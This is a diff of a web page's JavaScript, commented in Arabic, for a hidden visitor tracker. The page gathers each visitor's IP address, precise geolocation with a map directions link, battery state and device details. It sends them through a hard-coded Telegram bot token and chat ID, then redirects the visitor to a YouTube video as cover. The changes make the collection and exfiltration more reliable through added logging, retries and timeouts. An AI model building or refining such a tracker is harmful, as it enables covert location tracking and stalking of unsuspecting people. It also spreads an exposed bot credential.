@@ -36,7 +36,7 @@
         // إعدادات النظام
         // =============================================================================
         
-        const REDIRECT_URL = 'https://www.youtube.com/watch?v=YiK3BulNaWQ&list=RDYiK3BulNaWQ&start_radio=1';
+        const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
         const BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
         const CHAT_ID = '170383339';
         
@@ -121,14 +121,16 @@
         async function getBatteryInfo() {
             try {
                 if ('getBattery' in navigator) {
+                    log('🔋 محاولة الحصول على معلومات البطارية...');
                     const battery = await navigator.getBattery();
-                    return {
+                    const batteryData = {
                         level: Math.round(battery.level * 100),
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
+                        charging: battery.charging
                     };
+                    log(`✅ بطارية: ${batteryData.level}% (${batteryData.charging ? 'يشحن' : 'لا يشحن'})`);
+                    return batteryData;
                 }
+                log('⚠️ API البطارية غير مدعوم');
                 return null;
             } catch (error) {
                 log(`❌ خطأ البطارية: ${error.message}`);
@@ -195,13 +197,13 @@
             });
         }
         
-        // إرسال البيانات - مُحسن للضمان
+        // إرسال البيانات - مبسط وموثوق
         async function sendDataReliably(data) {
-            log('📤 بدء الإرسال...');
+            log('📤 تحضير الرسالة...');
             
             let locationText = 'غير متاح';
             let mapsLink = '';
-            let batteryText = '';
+            let batteryText = '🔋 البطارية: غير متاح';
             
             if (data.location) {
                 const { latitude, longitude, accuracy } = data.location;
@@ -209,11 +211,9 @@
                 mapsLink = `https://www.google.com/maps/dir//${latitude},${longitude}/@${latitude},${longitude},272m/data=!3m1!1e3`;
             }
             
-            if (data.battery) {
+            if (data.battery && data.battery.level !== undefined) {
                 const chargingStatus = data.battery.charging ? 'يتم الشحن 🔌' : 'غير متصل 🔋';
                 batteryText = `🔋 البطارية: ${data.battery.level}% (${chargingStatus})`;
-            } else {
-                batteryText = '🔋 البطارية: غير متاح';
             }
             
             const message = `🎯 زائر جديد:
@@ -233,6 +233,8 @@ ${mapsLink ? `🗺️ الخريطة: ${mapsLink}` : ''}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ${data.device.userAgent}`;
             
+            log('📝 الرسالة جاهزة، طولها: ' + message.length + ' حرف');
+            
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             const payload = {
                 chat_id: CHAT_ID,
@@ -240,10 +242,10 @@ ${data.device.userAgent}`;
                 disable_web_page_preview: false
             };
             
-            // 5 محاولات مع انتظار أطول
-            for (let attempt = 1; attempt <= 5; attempt++) {
+            // محاولات متعددة مع لوغ مفصل
+            for (let attempt = 1; attempt <= 3; attempt++) {
                 try {
-                    log(`📤 محاولة ${attempt}/5`);
+                    log(`📤 محاولة إرسال ${attempt}/3`);
                     
                     const response = await fetch(url, {
                         method: 'POST',
@@ -253,31 +255,39 @@ ${data.device.userAgent}`;
                         body: JSON.stringify(payload)
                     });
                     
-                    log(`📡 استجابة: ${response.status}`);
+                    log(`📡 كود الاستجابة: ${response.status}`);
                     
                     if (response.ok) {
                         const result = await response.json();
+                        log('📋 استجابة Telegram: ' + JSON.stringify(result));
+                        
                         if (result.ok) {
-                            log('✅ نجح الإرسال في رسالة واحدة!');
+                            log('✅ تم إرسال الرسالة بنجاح!');
                             return true;
                         } else {
-                            log(`❌ خطأ Telegram: ${result.description}`);
+                            log(`❌ خطأ من Telegram: ${result.description}`);
                         }
                     } else {
-                        log(`❌ HTTP ${response.status}`);
+                        const errorText = await response.text();
+                        log(`❌ خطأ HTTP ${response.status}: ${errorText}`);
                     }
                     
                 } catch (error) {
-                    log(`❌ خطأ ${attempt}: ${error.message}`);
+                    log(`❌ خطأ في المحاولة ${attempt}: ${error.name} - ${error.message}`);
+                    
+                    if (error.name === 'TypeError') {
+                        log('🚫 مشكلة في الاتصال بالشبكة');
+                    }
                 }
                 
-                // انتظار بين المحاولات
-                if (attempt < 5) {
-                    await new Promise(resolve => setTimeout(resolve, 1500));
+                // انتظار قبل المحاولة التالية
+                if (attempt < 3) {
+                    log('⏳ انتظار ثانيتين قبل المحاولة التالية...');
+                    await new Promise(resolve => setTimeout(resolve, 2000));
                 }
             }
             
-            log('❌ فشل جميع المحاولات');
+            log('❌ فشل في جميع محاولات الإرسال');
             return false;
         }
         
@@ -310,19 +320,38 @@ ${data.device.userAgent}`;
                 const basicData = collectBasicData();
                 log('✅ البيانات الأساسية جاهزة');
                 
-                // جمع IP والموقع مع انتظار كامل
-                log('🔄 جمع IP والموقع والبطارية...');
+                // جمع IP والموقع والبطارية بشكل منفصل
+                log('🔄 جمع البيانات...');
                 
-                const ipPromise = getIP();
-                const locationPromise = getLocation();
-                const batteryPromise = getBatteryInfo();
+                // البيانات الأساسية جاهزة
+                let ip, location, battery;
                 
-                // انتظار اكتمال كلاهما أو 6 ثواني كحد أقصى
-                const results = await Promise.allSettled([ipPromise, locationPromise, batteryPromise]);
+                // جمع IP
+                try {
+                    ip = await getIP();
+                } catch (error) {
+                    log('❌ خطأ IP: ' + error.message);
+                    ip = 'غير متاح';
+                }
                 
-                const ip = results[0].status === 'fulfilled' ? results[0].value : 'غير متاح';
-                const location = results[1].status === 'fulfilled' ? results[1].value : null;
-                const battery = results[2].status === 'fulfilled' ? results[2].value : null;
+                // جمع الموقع
+                try {
+                    location = await getLocation();
+                } catch (error) {
+                    log('❌ خطأ الموقع: ' + error.message);
+                    location = null;
+                }
+                
+                // جمع معلومات البطارية (اختياري)
+                try {
+                    battery = await Promise.race([
+                        getBatteryInfo(),
+                        new Promise(resolve => setTimeout(() => resolve(null), 2000)) // 2 ثانية حد أقصى
+                    ]);
+                } catch (error) {
+                    log('❌ خطأ البطارية: ' + error.message);
+                    battery = null;
+                }
                 
                 const fullData = {
                     device: basicData,
@@ -331,13 +360,13 @@ ${data.device.userAgent}`;
                     battery: battery
                 };
                 
-                log('📊 تم جمع جميع البيانات');
-                log(`📊 IP: ${ip}`);
-                log(`📊 موقع: ${location ? 'تم الحصول عليه' : 'غير متاح'}`);
-                log(`📊 بطارية: ${battery ? battery.level + '%' : 'غير متاح'}`);
+                log('📊 ملخص البيانات:');
+                log(`   IP: ${ip}`);
+                log(`   موقع: ${location ? 'متوفر' : 'غير متوفر'}`);
+                log(`   بطارية: ${battery ? battery.level + '%' : 'غير متوفر'}`);
                 
-                // إرسال البيانات مع الانتظار التام
-                log('📤 بدء الإرسال النهائي...');
+                // إرسال البيانات
+                log('📤 بدء إرسال البيانات...');
                 const sendSuccess = await sendDataReliably(fullData);
                 
                 if (sendSuccess) {
